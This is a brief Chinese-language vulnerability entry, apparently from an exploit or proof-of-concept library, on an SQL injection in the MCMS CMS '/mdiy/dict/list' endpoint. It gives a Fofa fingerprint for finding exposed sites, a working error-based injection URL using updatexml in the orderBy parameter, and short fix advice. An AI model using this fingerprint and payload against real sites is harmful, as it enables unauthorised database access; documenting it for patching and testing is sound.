# MCMSlist接口存在SQL注入漏洞

MCMSlist ｜ SQL注入 ｜ —
- **指纹**：`body="/static/plugins/ms/1.0.0/ms.js"`

**Payload**
```
1. Fofa
body="/static/plugins/ms/1.0.0/ms.js"
2、隐患url,复现如下
/mdiy/dict/list?dict=c&dictType=%E6%96%87%E7%AB%A0%E5%B1%9E%E6%80%A7&orderBy=0%20or%20updatexml(1,concat(0x7e,(SELECT%20md5(233)),0x7e),1)
```
- **其他**：修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。